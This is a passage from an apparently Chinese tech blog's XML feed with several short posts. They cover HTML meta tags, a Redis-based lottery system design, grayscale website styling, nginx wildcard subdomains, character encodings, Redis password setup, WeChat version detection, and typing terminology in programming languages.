<li>SEO优化<a href="https://docs.microsoft.com/zh-cn/previous-versions/visualstudio/design-tools/expression-studio-4/ff724016(v=expression.40)" target="_blank" rel="noopener">参考文档</a></li>
</ul>
<p>页面关键词，每个网页应具有描述该网页内容的一组唯一的关键字。</p>
<p>使用人们可能会搜索，并准确描述网页上所提供信息的描述性和代表性关键字及短语。标记内容太短，则搜索引擎可能不会认为这些内容相关。另外标记不应超过 874 个字符。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"keywords"</span> <span class="attr">content</span>=<span class="string">"your tags"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>页面描述，每个网页都应有一个不超过 150 个字符且能准确反映网页内容的描述标签。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">"150 words"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>搜索引擎索引方式，robotterms是一组使用逗号(,)分割的值，通常有如下几种取值：none，noindex，nofollow，all，index和follow。确保正确使用nofollow和noindex属性值。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"robots"</span> <span class="attr">content</span>=<span class="string">"index,follow"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    all：文件将被检索，且页面上的链接可以被查询；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    none：文件将不被检索，且页面上的链接不可以被查询；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    index：文件将被检索；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    follow：页面上的链接可以被查询；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    noindex：文件将不被检索；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    nofollow：页面上的链接不可以被查询。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<p>页面重定向和刷新：content内的数字代表时间（秒），既多少时间后刷新。如果加url,则会重定向到指定网页（搜索引擎能够自动检测，也很容易被引擎视作误导而受到惩罚）。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0;url="</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">content</span>=<span class="string">"author name"</span> /&gt;</span> <span class="comment">&lt;!-- 定义网页作者 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"google"</span> <span class="attr">content</span>=<span class="string">"index,follow"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"googlebot"</span> <span class="attr">content</span>=<span class="string">"index,follow"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"verify"</span> <span class="attr">content</span>=<span class="string">"index,follow"</span> /&gt;</span>移动设备viewport：能优化移动浏览器的显示。如果不是响应式网站，不要使用initial-scale或者禁用缩放。 </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 针对手持设备优化，主要是针对一些老的不识别viewport的浏览器，比如黑莓 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"HandheldFriendly"</span> <span class="attr">content</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 微软的老式浏览器 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"MobileOptimized"</span> <span class="attr">content</span>=<span class="string">"320"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- uc强制竖屏 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"screen-orientation"</span> <span class="attr">content</span>=<span class="string">"portrait"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- QQ强制竖屏 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"x5-orientation"</span> <span class="attr">content</span>=<span class="string">"portrait"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- UC强制全屏 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"full-screen"</span> <span class="attr">content</span>=<span class="string">"yes"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- QQ强制全屏 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"x5-fullscreen"</span> <span class="attr">content</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- UC应用模式 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"browsermode"</span> <span class="attr">content</span>=<span class="string">"application"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- QQ应用模式 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"x5-page-mode"</span> <span class="attr">content</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- windows phone 点击无高光 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"msapplication-tap-highlight"</span> <span class="attr">content</span>=<span class="string">"no"</span>&gt;</span>网页相关申明编码<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">'utf-8'</span> /&gt;</span>优先使用 IE 最新版本和 Chrome <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge,chrome=1"</span> /&gt;</span><span class="comment">&lt;!-- 关于X-UA-Compatible --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=6"</span> &gt;</span><span class="comment">&lt;!-- 使用IE6 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=7"</span> &gt;</span><span class="comment">&lt;!-- 使用IE7 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=8"</span> &gt;</span><span class="comment">&lt;!-- 使用IE8 --&gt;</span></span><br></pre></td></tr></table></figure>

<p>浏览器内核控制：国内浏览器很多都是双内核（webkit和Trident），webkit内核高速浏览，IE内核兼容网页和旧版网站。而添加meta标签的网站可以控制浏览器选择何种内核渲染。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"renderer"</span> <span class="attr">content</span>=<span class="string">"webkit|ie-comp|ie-stand"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>国内双核浏览器默认内核模式如下：</p>
<ul>
<li><p>搜狗高速浏览器、QQ浏览器：IE内核（兼容模式）</p>
</li>
<li><p>360极速浏览器、遨游浏览器：Webkit内核（极速模式）</p>
</li>
</ul>
<p>禁止浏览器从本地计算机的缓存中访问页面内容：这样设定，访问者将无法脱机浏览。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Pragma"</span> <span class="attr">content</span>=<span class="string">"no-cache"</span>&gt;</span>Windows 8</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"msapplication-TileColor"</span> <span class="attr">content</span>=<span class="string">"#000"</span>/&gt;</span> <span class="comment">&lt;!-- Windows 8 磁贴颜色 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"msapplication-TileImage"</span> <span class="attr">content</span>=<span class="string">"icon.png"</span>/&gt;</span> <span class="comment">&lt;!-- Windows 8 磁贴图标 --&gt;</span></span><br><span class="line"></span><br><span class="line">站点适配：主要用于PC-手机页的对应关系。</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"mobile-agent"</span><span class="attr">content</span>=<span class="string">"format=[wml|xhtml|html5]; url=url"</span>&gt;</span><span class="comment">&lt;!--[wml|xhtml|html5]根据手机页的协议语言，选择其中一种；url="url" 后者代表当前PC页所对应的手机页URL，两者必须是一一对应关系。 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Cache-Control"</span> <span class="attr">content</span>=<span class="string">"no-siteapp"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>如何开发公司年会抽奖系统</title>
    <url>/articles/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%85%AC%E5%8F%B8%E5%B9%B4%E4%BC%9A%E6%8A%BD%E5%A5%96%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h3 id="需求出现"><a href="#需求出现" class="headerlink" title="需求出现"></a>需求出现</h3><p>年会将近，而年会抽奖环节必不可少，但是抽奖系统却还没有。所以某一天，PM走过来说：小伙，手头的需求修完成了吧！在年会开始之前必须做出一个抽奖系统。这个系统很简单，后台可以设置总金额，然后每个用户可以获得的金额范围，金额派完则显示很遗憾没有中奖，还要设置抽奖活动时间。</p>
<p><img src="/articles/如何开发公司年会抽奖系统/0.png" alt></p>
<h3 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h3><p>一看这东西，就觉得非常简单。最简单的一个方案，活动时间放在一个数据表，总金额和已经使用金额存放在一个表，已经派送的日志一个表。后台提供一个接口，客户端手动点击按钮，则发送一个请求。账号体系直接使用微信的oauth，接口首先判断活动有没有开始，如果开始则随机一个金额，然后判断如果派送该金额会不会超预算，如果不超预算，则调用微信的现金接口发放零钱。</p>
<p><img src="/articles/如何开发公司年会抽奖系统/1.png" alt></p>
<h3 id="并发问题"><a href="#并发问题" class="headerlink" title="并发问题"></a>并发问题</h3><p>这个简单方案存在一个致命的问题，就是并发下，可能导致超预算的问题。如果采用加锁的方式，面对1000多员工同时请求，系统100%瘫痪。（因为抽奖系统的服务器是最普通的1核1G 1M带宽的服务器）</p>
<p><img src="/articles/如何开发公司年会抽奖系统/2.png" alt></p>
<p>那么不加锁的情况，又能如何避免并发造成的派送超过预算的问题呢？ 一个简单的办法，把分配派送金额的操作从并行变成串行。那么就需要异步的编程方法。最简单的处理方法，把任务写入mysql，然后启动一个独立的进程来一个任务一个任务的串行处理。异步的话，客户端如何知道服务器已经处理了呢？最简单就是采用轮询的方法了，客户端每隔几秒就请求服务器一次。</p>
<p><img src="/articles/如何开发公司年会抽奖系统/3.png" alt></p>
<h3 id="性能问题"><a href="#性能问题" class="headerlink" title="性能问题"></a>性能问题</h3><p>由于抽奖是短时间大量用户请求的，如果直接让请求落到mysql，类似DDOS攻击,一般的数据库是扛不住的。而redis是1种基于内存的高并发NoSQL,在很多公司广泛使用,由于其性能非常好，并且其丰富的数据接口完全可以胜任抽奖任务需求。 这个时候，你可能有这样的疑问,我们的系统设计是怎么样的呢？</p>
<p>抽奖系统相关配置存储在redis的一个key值，直接使用json格式客户端请求的时候判断，时间是否在活动时间范围内客户端请求如果时间在活动范围内，则把用户添加到一个redis集合，用于防止用户重复请求，只有第一次请求才会添加到集合后，再添加到一个redis列表。后台一个独立的进程，从redis列表pop第一位用户，然后分配一个金额，然后把金额和用户信息压入另一个redis列表B，同时写入redis的hash结构，标示用户获得多少现金。一直循环该过程。后台另一个独立的进程，从redis列表B pop第一位用户，然后调用发送现金接口，一直循环该过程。客户端不停轮询获取用户金额的接口，该接口从哪个hash结构获取用户金额，然后没有数据，则告诉客户端若干秒后再次请求。</p>
<p><img src="/articles/如何开发公司年会抽奖系统/4.png" alt></p>
<h3 id="前端优化"><a href="#前端优化" class="headerlink" title="前端优化"></a>前端优化</h3><p>由于参与活动的人数较多，而且服务器是放在外网的，所以需要考虑带宽的问题。</p>
<p>第一步，把静态资源放到cdn。第二步，抽奖页面静态化，同时也放到cdn，这样子服务器只需要承受用户请求和登录即可。第三步，由于采用了微信登录，所以登录系统采用一个独立的进程，并且使用异步框架来处理高并发。第四步，前端发送请求队列化处理，避免用户不停点击，造成大量请求。</p>
<p><img src="/articles/如何开发公司年会抽奖系统/5.png" alt></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>整套系统开发没有任何难度，唯一需要注意高并发下性能和数据问题。静态资源放到cdn，避免带宽成为瓶颈。把mysql操作变成redis操作，解决io问题</p>
]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>如何让网站变灰</title>
    <url>/articles/%E5%A6%82%E4%BD%95%E8%AE%A9%E7%BD%91%E7%AB%99%E5%8F%98%E7%81%B0/</url>
    <content><![CDATA[<p>今天给大家分享一个web前端的小技巧哦，就是如何在公共哀悼纪念日，让网站变为黑白颜色。其实很多方法有css实现，和js实现的。网上都有的，js有js的特点，css有css优点，当然缺点也是存在。</p>
<p><strong>1.超兼容IE，火狐firefox，谷歌的css滤镜</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line"></span><br><span class="line">    filter: grayscale(100%);//IE浏览器</span><br><span class="line"></span><br><span class="line">    -webkit-filter: grayscale(100%);//谷歌浏览器</span><br><span class="line"></span><br><span class="line">    -moz-filter: grayscale(100%);//火狐</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">-ms-filter</span>: <span class="selector-tag">grayscale</span>(100%);</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">-o-filter</span>: <span class="selector-tag">grayscale</span>(100%);</span><br><span class="line"></span><br><span class="line">    filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1);</span><br><span class="line"></span><br><span class="line">    -webkit-filter: grayscale(1);//谷歌浏览器</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>优点：基本兼容所有浏览器。</p>
<p>缺点：就是ie6可能嗝屁了，ie页面电脑资源消耗肯能大一点。</p>
<p><strong>2.js代码实现grayscale.js代码实现</strong></p>
<p>引用文件，就不要讲了吧，好吧还是说一下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">"http://james.padolsey.com/demos/grayscale/grayscale.js"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">    grayscale(<span class="built_in">document</span>.getElementById(<span class="string">"thisImage"</span>));</span><br><span class="line"></span><br><span class="line">&lt;script _ue_org_tagname=<span class="string">"script"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>优点：兼容所有浏览器,还能针对不同dom来实现</p>
<p>缺点：电脑资源消耗肯能大一点，尤其老ie，老电脑浏览器一度卡死。</p>
<p><strong>3.SVG滤镜实现</strong></p>
<p>新建一个空白文件，比如说：gray.svg. 拷贝进去如下的XML代码：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;svg version="1.1"xmlns="http://www.w3.org/2000/svg"&gt;</span><br><span class="line">    &lt;filter id="grayscale"&gt;</span><br><span class="line">    &lt;feColorMatrix type="matrix" values="0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0"/&gt;</span><br><span class="line">    &lt;<span class="selector-tag">filter</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">svg</span>&gt;</span><br></pre></td></tr></table></figure>

<p>CSS调用代码：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">filter</span>: <span class="selector-tag">url</span>(<span class="selector-tag">gray</span><span class="selector-class">.svg</span><span class="selector-id">#grayscale</span>);</span><br></pre></td></tr></table></figure>

<p>对应ie还要多写一下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">filter</span>: <span class="selector-tag">gray</span>;</span><br></pre></td></tr></table></figure>

<p>优点：兼容所有浏览器</p>
<p>缺点：修改很麻烦。</p>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>如何创建泛域名</title>
    <url>/articles/%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E6%B3%9B%E5%9F%9F%E5%90%8D/</url>
    <content><![CDATA[<p>在域名管理处做一个泛解析 <em>.domain.com 指向服务器的ip, 然后在Nginx配置文件里面增加配置,这个配置还可以制作多级域名,例如</em>.demo.domain.com.</p>
<p>例子:  web主目录下创建一个test的文件夹自动生成一个叫test.domain.com 的网址.</p>
<p>WEB_ROOT : /data/www</p>
<p>HOST:  domain.com</p>
<p>*NGINX配置代码:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">    listen      80;</span><br><span class="line"></span><br><span class="line">    server_name  ~^(?&lt;subdomain&gt;.+)\.domain\.com$;</span><br><span class="line"></span><br><span class="line">    root   /web/data/www/<span class="variable">$subdomain</span>;</span><br><span class="line"></span><br><span class="line">    index  index.php index.html index.htm;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line"></span><br><span class="line">        fastcgi_param SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!-e <span class="variable">$request_filename</span>) &#123;</span><br><span class="line"></span><br><span class="line">            rewrite  ^(.*)$  /index.php?s=<span class="variable">$1</span>/  last;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">break</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ .*\.php(\/.*)*$ &#123;</span><br><span class="line"></span><br><span class="line">        fastcgi_pass  unix:/tmp/php-cgi.sock;</span><br><span class="line"></span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line"></span><br><span class="line">        include fastcgi.conf;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>字符编码基础</title>
    <url>/articles/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>ACSII规定：一个字符由一个字节存储。范围：前32位（0x00 — 0x20）为控制码。第32位至127位（0x20 — 0x7f）为空格、标点符号、数字、字母。127位以后不用。</p>
<p><code>扩展字符集</code></p>
<p>原因： 由于其它国家的字符太多，ASCII标准已经不够用，所以他们启用了127位以后的全部空位。</p>
<p><code>GB2312</code></p>
<p>原因：由于其它国家制定的扩展字符集并不适用于中文，所以中国人重新制定了符合本国国情的编码方式：GB2312（GB2312是对ASCII码的中文扩展）。规定：小于127的字符意义同ASCII标准一样，但两个大于127的字符连在一起时，就表示一个汉字。范围：前一个字节（高字节）使用范围为：0xa1 — 0xf7后一个字节（低字节）使用范围为：0xa1 — oxfe</p>
<p><code>GBK</code></p>
<p>原因：后来由于汉字实在太多，GB2312已经不够使用了，于是又制定了新的编码:GBK，取消了GB2312中对汉字低字节的限制。规定: 小于127的字符意义同ASCII标准一样，如果遇到大于127位的字节则无论其后的一个字节是否是大于127都将这个两个字节视为一个汉字（GB2312要求两个字节都要大于127，但GBK取消了对低字节的要求）。范围：前一个字节（高字节）使用范围为：0x81 — 0xfe后一个字节（低字节）使用范围为：0x40 — 0xfe</p>
<p><code>GB18030</code></p>
<p>原因: 由于GBK并没有包含少数民族的文字字符，所以又再次对GBK进行扩展以包含少数名族字符，由此又制定了新的编码GB18030，从此该编码方式可以完全表示中华民族的所有字符了。</p>
<p>小结：人们为了统一称呼这些【汉字】编码方式，于是把它们都叫做DBCS（Double Byte Charecter Set，双字节字符集），它们最大的特点就是两个字节长的汉字字符和一个字节长的英文字符并存在一套编码系统里。因此在处理这些编码时要时刻注意每一个字节的值是否是大于127，如果小于则取按照ASCII标准取值，如过大于则表示一个汉字开始了，这时就要和它和后面一个字节一起组合起来识别为一个汉字字符。</p>
<p><code>Unicode</code></p>
<p>原因： 由于每个国家都制定了自己的一套编码体系，造成各个国家之间的字符编码互不兼容，于是ISO组织统一制定了能包含全球所有文化、字符、符号的编码标准：Universal Multiple-Octet Coded Character Set”，简称 UCS, 俗称 “UNICODE”。规定： Unicode规定所有字符都统一使用两个字节编码，即使用16位来统一表示所有字符，对于ASCII标准的字符保持其值不变，但字节长度由一个字节变成两个字节，所以英文字符的Unicode编码的高字节永远都为0，因此也造成了存储空间的浪费。</p>
<p><code>UTF-8</code></p>
<p>定义： UTF即UCS Transfer Format（Unicode传输格式），utf-8是在网络上传输Unicode字符的一项标准，它是Unicode的主要实现方式之一。它每次传输8位数据，但它并不是直接对应Unicode的字节的值，而是为了传输的可靠性制定了一套从Unicode到utf-8的转换规则。转换规则：</p>
<table>
<thead>
<tr>
<th align="left">Unicode</th>
<th align="left">UTF-8</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0000 - 007F</td>
<td align="left">0xxxxxxx</td>
</tr>
<tr>
<td align="left">0080 - 07FF</td>
<td align="left">110xxxxx 10xxxxxx</td>
</tr>
<tr>
<td align="left">0800 - FFFF</td>
<td align="left">1110xxxx 10xxxxxx 10xxxxxx</td>
</tr>
</tbody></table>
<p>举例： ‘汉’字的Unicode编码是：6C49，通过上表可以得出，它在0x0800到0xffff之间，所以它需要使用3个字节来传输，将6C49转位二进制： 0110 1100 0100 1001，按照utf-8的格式转换，第一个字节为：[1110]0110，第二个字节为:[10]110001，第三个字节为：[10]001001，所以将‘汉’字的unicode转换为utf-8之后的二进制是：11100110 10110001 10001001 ，即16进制E6 B1 89</p>
<p>单字节： 由一个字节构成一个字符的编码。如ASCII</p>
<p>多字节： 由一个或多个字节构成一个字符的编码。如GB2312、GBK宽字节： 始终由两个字节构成一个字符的编码。如Unicode</p>
]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>如何给redis设置密码</title>
    <url>/articles/%E5%A6%82%E4%BD%95%E7%BB%99redis%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>redis没有实现访问控制这个功能，但是它提供了一个轻量级的认证方式，可以编辑redis.conf配置来启用认证。</p>
<p>1、初始化Redis密码：</p>
<p>在配置文件中有个参数： requirepass  这个就是配置redis访问密码的参数；</p>
<p>比如 requirepass test123；</p>
<p>（Ps:需重启Redis才能生效）</p>
<p>redis的查询速度是非常快的，外部用户一秒内可以尝试多大150K个密码；所以密码要尽量长（对于DBA 没有必要必须记住密码）；</p>
<p>2、不重启Redis设置密码：</p>
<p>在配置文件中配置requirepass的密码（当redis重启时密码依然有效）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; config set requirepass test123</span><br></pre></td></tr></table></figure>

<p>查询密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; config get requirepass</span><br><span class="line"></span><br><span class="line">(error) ERR operation not permitted</span><br></pre></td></tr></table></figure>

<p>密码验证：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; auth test123</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>再次查询：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; config get requirepass</span><br><span class="line"></span><br><span class="line">1) "requirepass"</span><br><span class="line"></span><br><span class="line">2) "test123"</span><br></pre></td></tr></table></figure>

<p>PS：如果配置文件中没添加密码 那么redis重启后，密码失效；</p>
<p>3、登陆有密码的Redis：</p>
<p>在登录的时候的时候输入密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -p 6379 -a test123</span><br></pre></td></tr></table></figure>

<p>先登陆后验证：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -p 6379</span><br><span class="line"></span><br><span class="line">redis 127.0.0.1:6379&gt; auth test123</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>AUTH命令跟其他redis命令一样，是没有加密的；阻止不了攻击者在网络上窃取你的密码；</p>
<p>认证层的目标是提供多一层的保护。如果防火墙或者用来保护redis的系统防御外部攻击失败的话，外部用户如果没有通过密码认证还是无法访问redis的。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>微信版本判断</title>
    <url>/articles/%E5%BE%AE%E4%BF%A1%E7%89%88%E6%9C%AC%E5%88%A4%E6%96%AD/</url>
    <content><![CDATA[<p>微信团队建议通过user agent来确定用户当前的版本号。以iPhone版本为例，可以通过user agent可获取如下版本示例信息：</p>
<p>“Mozilla/5.0(iphone;CPU iphone OS 5_1_1 like Mac OS X)</p>
<p>AppleWebKit/534.46(KHTML,like Geocko)Mobile/9B206 MicroMessenger/6.0.2 “</p>
<p>其中6.0.2为用户安装的微信版本号</p>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>弱类型、强类型、动态类型、静态类型语言的区别是什么？</title>
    <url>/articles/%E5%BC%B1%E7%B1%BB%E5%9E%8B-%E5%BC%BA%E7%B1%BB%E5%9E%8B-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%9E%8B-%E9%9D%99%E6%80%81%E7%B1%BB%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88-/</url>
    <content><![CDATA[<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p><strong>Program Errors</strong></p>
<ul>
<li><em>trapped errors</em>。导致程序终止执行，如除0，Java中数组越界访问</li>
<li><em>untrapped errors</em>。 出错后继续执行，但可能出现任意行为。如C里的缓冲区溢出、Jump到错误地址</li>
</ul>
<p><strong>Forbidden Behaviours</strong></p>
<p>语言设计时，可以定义一组<em>forbidden behaviors</em>. 它必须包括所有untrapped errors, 但可能包含trapped errors.</p>
<p><strong>Well behaved、ill behaved</strong></p>
<ul>
<li><em>well behaved</em>: 如果程序执行不可能出现forbidden behaviors, 则为well behaved。</li>
<li><em>ill behaved</em>: 否则为<em>ill behaved</em>…</li>
</ul>
<h2 id="强、弱类型，静态、动态类型"><a href="#强、弱类型，静态、动态类型" class="headerlink" title="强、弱类型，静态、动态类型"></a>强、弱类型，静态、动态类型</h2><p><strong>强、弱类型</strong></p>
<ul>
<li><em>强类型strongly typed</em>：如果一种语言的所有程序都是well behaved——即不可能出现forbidden behaviors，则该语言为strongly typed。</li>
<li><em>弱类型weakly typed</em>：则为weakly typed。比如C语言的缓冲区溢出，属于trapped errors，即属于forbidden behaviors..故C是弱类型</li>
</ul>
<p>前面的人也说了，弱类型语言，类型检查更不严格，如偏向于容忍隐式类型转换。譬如说C语言的int可以变成double。 这样的结果是：容易产生forbidden behaviours，所以是弱类型的</p>
<p><strong>动态、静态类型</strong></p>
<ul>
<li><em>静态类型 statically</em>:  如果在编译时拒绝ill behaved程序，则是statically typed;</li>
<li><em>动态类型dynamiclly</em>:   如果在运行时拒绝ill behaviors, 则是dynamiclly typed。</li>
</ul>
<h2 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h2><p>大家觉得C语言要写int a, int b之类的，Python不用写(可以直接写a, b)，所以C是静态，Python是动态。这么理解是不够准确的。譬如Ocaml是静态类型的，但是也可以不用明确地写出来，所以 Ocaml是<strong>静态隐式类型</strong></p>
<p>静态类型可以分为两种：</p>
<ul>
<li>如果类型是语言语法的一部分，在是explicitly typed显式类型；</li>
<li>如果类型通过编译时推导，是implicity typed隐式类型, 比如ML和Haskell</li>
</ul>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><table>
<thead>
<tr>
